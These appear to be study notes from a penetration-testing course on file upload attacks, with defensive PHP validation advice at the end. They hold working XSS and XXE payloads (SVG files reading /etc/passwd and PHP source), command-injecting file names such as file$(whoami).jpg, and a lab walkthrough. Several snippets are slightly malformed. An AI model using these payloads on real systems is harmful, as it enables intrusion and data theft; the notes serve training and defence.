# Limited File Uploads
We have been mainly dealing with filter bypassed to obtain arbitrary file uploads through a vulnerable web app, which it the main focus of this module at this level.
While upload froms with weak filters can be exploited to upload arbitrary files, some uploads forms have secure filters that may not be
exploitable with the techniques we discussed.
Even if we are dealing with a limited, file upload attack. It enables us to explore what attacks may be achievable on the web server

- XSS
Many files types may allow us to introduc a Stored XSS vulnerablility to the web app by uploading maliciusly crafted versions.
The most basic example is when a web app allows us to upload HTML files. Files won't allow us to execute code it would still be possible to implement JS code within them  to carry an XSS opr CSRF
attack on whoever visits the upploaded HTML page.
If the target sees a link form a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.
Another example of XSS attacks os web app that display an image's metadata its uploade. For such web app, we can incluide an XSS payload in one of metadata parameters.
```sh
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg

```
We can see that the commnet parameter was updated to our XSS payload. When the images metadata is displayed, the XSS payload should be triggered , and the JS code will be execute to carry the XSS attack.
If we change the image's MIME-Type to text/html some web app may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't direclty displayed.
Xss attacks can also be carried with SVG image, along with seceral toher attacks, Scalable Vector Graphics image are XML-based, and they describe 2D vector Graphics, which the browser renders into an image.
We modify their XML data to include an XSS payload we can write the code:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

- XEE
Similar attack can be carried to lead XXE exploitation, we can also include malicius XML data leak the source code of the web app.
```xml
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Once the above SVG image is uploaded and viewed, the XML docuemtn would get processed, and we should het the /etc/passwd printed on the page or shown in the page source.
Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation,
it may allow us to locate the upload directory, identify allowed extensions, or find the file naming scheme, which may become handy for further exploitation.
To use XXE to read source code in PHP web app, we can use the payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
Once the SVG image is displayed, we shpild get the base64-encode content of index.php which can decode to read source code.
Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like PDF, Word Documents, PowerPoint Documents, among many others.

- DoS:
Many files upload vulnerablilities may lead to a Denial of Service attack on the web server, we can us the XXE payloads to achieve DoS attacks.
We can utilize [Decompression Bomb] with file types that use data compression, like ZIP archieves. If a web app automatically unzips a Zip, is possible to upload a malicius
archive containing nestes ZIP archieve.
Another possible is a [pixel flood] attack with some image files that utilize images compression, like JPG or PNG. We cna create any JPG image file iwht any image size and then manually
modify its compression data to say it has s size of [0xffff x 0xffff], which results in an image with a perceived size of 4 Gigapixels.

If the upload funtion is vulnerable to directory traversal, we may also attempt uploading files to a different direcory. Try to search for other example of DoS attacks through a vulnerable file upload
fucionality.

Exercise:
The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"

First we need to veiw the source code and try to upload the payload:
```xml
// Payload save like svg cause is only accepted that.
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```
Before upload we can see the source code and found the flag

Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)

Is so similar but we must chage the payload:
```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
Then in source code we found the `PD9waHAKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7Cgokc3ZnX2ZpbGUgPSBmaWxlX2dldF9jb250ZW50cygnLi9pbWFnZXMvJyAuIGZpbGVfZ2V0X2NvbnRlbnRzKCcuL2ltYWdlcy9sYXRlc3QueG1sJykpOwokZG9jID0gbmV3IERPTURvY3VtZW50KCk7CiRkb2MtPmxvYWRYTUwoJHN2Z19maWxlLCBMSUJYTUxfTk9FTlQgfCBMSUJYTUxfRFRETE9BRCk7CiRzdmcgPSAkZG9jLT5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc3ZnJyk7Cj8`
and Decode that and see:
```php
<?php
libxml_disable_entity_loader(false);

$svg_file = file_get_contents('./images/' . file_get_contents('./images/latest.xml'));
$doc = new DOMDocument();a
$doc->loadXML($svg_file, LIBXML_NOENT | LIBXML_DTDLOAD);
$svg = $doc->getElementsByTagName('svg');
?
```

# Other upload attacks:
- Injections in File Name:
A common file upload attack uses a malicius string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed on the page. We can try injecting a command in the file name, and if the web app uses the file ne with OS command it may lead to a command injection attack.
Example:
IF we name a file fiel$(whoami).jpg or file'whoami'.jpg or file.jpg||whoami. and then the web app attempts to move the uploaded file with an OS command, then file name would inject the whoami command, which
would get executed, leading to remote code execution.
We may use an XSS payload in the file name, which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name, which may
lead to an SQL injection if the file name is insecurely used in a SQL query.

- Upload directory disclosure:
In some file upload forms, like feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uplaods directory. We may utilize fuzzing to look for upload dir
or even use other vulnerabilities, to find the uploaded files are by readig the web app source code.

Another method we can use is disclose the uploads dir is though forcing error message, as they often reveal helpful information for further explotation. One attack we can us to cause such a error is uploading a file with a name that already exists or sending  two identical request simultaneously.
This may lead the web server to show an error that it could not write the file, which may disclose the uplaods dir.

- Windows-specific Attacks:
We can also use a few Windows-specific techniques in some of the attacks we discussed.
One such attack is using reserved characters, such as (|,<,>,* or ?) which are usually reserved for special uses like wildcards. If the web app does not properly sanitaze these names or wrap them within quotes, they may refer to another file and cause
an error that discloses the upload directory. We may use windows reserved names for the uploaded file name. like (CON, COM1, LPT1 OR NULL) which may also cause an error as the web app will not be allowed to write a file name.

We may utilize the Windows File Name Convention [Wiki](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing file or refer to file that do not exist.  To refer to a file called htb.txt we can use [HAC~1.TXT] or [HAC~2.TXT] where the digit represent the order of the matching files that start with HAC. As Windows still supp this convention, we can write a file called to
overwrite the web.conf file.

- Advanced File Upload ATTACK:
Some commonly used libraries may have public explots for such vulnerablilities, like the AVI upload leading to XXE in [ffmpeg]. When dealing with custom code and custom libraries, detecting such vulnerablilities requere more
advanced knowledge and techniques, which may lead to discovery and advanced file upload vulnerablility in some web apps.


# Preventing File Uplaod Vulnerbility:

- Extension Validation:
The fist and most common type of upload vulnerablilities we discussed in this module was file extension validation, file extensions play an imp role in how files and script are executed,
as most web app tend to use file extesnions to set their excution properties.
While whitelist extensions is always more secure, as we have seen previusly, it's recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions.
Uploading malicius scripts if the whitelist is ever bypassed.
Framework:
```php
<?php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
?>
```
- Content Validation:
AS we have also learned in this module, extesnion validation is not enoughm as we should also validation the file content. We cannot validate one without the other and must always validate both the file extension and its content.
The following example shows us how ewr can validate the file extension through whitelist, and validate both the File Signature and th HTTP Content-type header:

```php
<?php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
?>
```
- Uplaod Disclousure:
Another thing we should avoid doing is disclosing the uploads directory or providing direct access to the uploaded.
We may write a dowload.php script to fetch the requested file from the uploads directory then download the file for the end-user. The web app hides the uplaods directory and prevents the user from directly
accessing the uploaded file.
If we utilize a download page, we should make sure that the download.php script only grants access to files owned by the users (i.e., avoid IDOR/LFI vulnerabilities) and that the users do not have direct access to the uploads directory (i.e., 403 error).
This can be achieved by utilizing the Content-Disposition and nosniff headers and using an accurate Content-Type header.
In addition to restricting the uploads directory, we should also randomize the names of the uploaded files in storage and store their "sanitized" original names in a database. When the download.php script needs to download a file, it fetches its original name from the database and provides it at download time for the user.

- Further Security:
The above tips should significantly reduce the chances of uploading and accessing a malicius file. We can take a few other measueres to enusure that the back-end server is not
compromised if any of the above measure are bypassed.
A critical cofiguration we cna add disabling specific funtions that may be used to execute system commands throigh the web app. We can use teh [disable_funtions] conf in php.ini and add such dangerous funtions, like [exec, shel_ecec, system, passthru].
Following are a few other tips we should consider for our web app:
    - Limit file size
    - Update any used libraries
    - Scan uploaded Files for malware or malicius strings
    - Utilize a Web app firewall as secondary layer of protection



